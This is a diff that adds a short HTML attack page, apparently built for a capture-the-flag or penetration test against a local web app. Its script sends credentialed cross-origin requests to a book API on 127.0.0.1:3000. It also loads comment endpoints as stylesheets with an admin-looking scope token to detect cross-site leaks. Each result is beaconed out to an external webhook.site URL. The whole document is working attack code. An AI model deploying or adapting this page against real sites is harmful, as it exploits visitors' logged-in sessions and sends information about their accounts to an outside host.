@@ -1,0 +1,13 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body><h1>p</h1><script>
+const W='https://webhook.site/f00e8d5a-a044-442e-a4e1-e242359c5425';
+function b(x){ (new Image).src=W+'/'+encodeURIComponent(x)+'?_='+Math.random(); }
+b('pstart');
+window.onerror=function(m){b('winerr_'+encodeURIComponent(m));};
+fetch('http://127.0.0.1:3000/api/books',{mode:'no-cors',credentials:'include'}).then(function(r){b('nocr_'+r.type+'_'+r.status);}).catch(function(e){b('nocr_err_'+encodeURIComponent(e.message));});
+fetch('http://127.0.0.1:3000/api/books',{mode:'cors',credentials:'include'}).then(function(r){return r.text();}).then(function(t){b('cors_ok_'+t.length);}).catch(function(e){b('cors_err_'+encodeURIComponent(e.message));});
+var l=document.createElement('link'); l.rel='stylesheet'; l.href='http://127.0.0.1:3000/api/comment/2c62c708-1c01-4302-9e10-8da4b5f551d9?scope=764994b1-7eeb-4f3e-8faa-da2068beda80';
+l.onload=function(){b('lkadm_load');}; l.onerror=function(){b('lkadm_err');}; document.head.appendChild(l);
+var l2=document.createElement('link'); l2.rel='stylesheet'; l2.href='http://127.0.0.1:3000/api/comment/11111111-1111-4111-8111-111111111111?scope=';
+l2.onload=function(){b('lkpub_load');}; l2.onerror=function(){b('lkpub_err');}; document.head.appendChild(l2);
+setTimeout(function(){b('alive');},2500);
+</script></body></html>
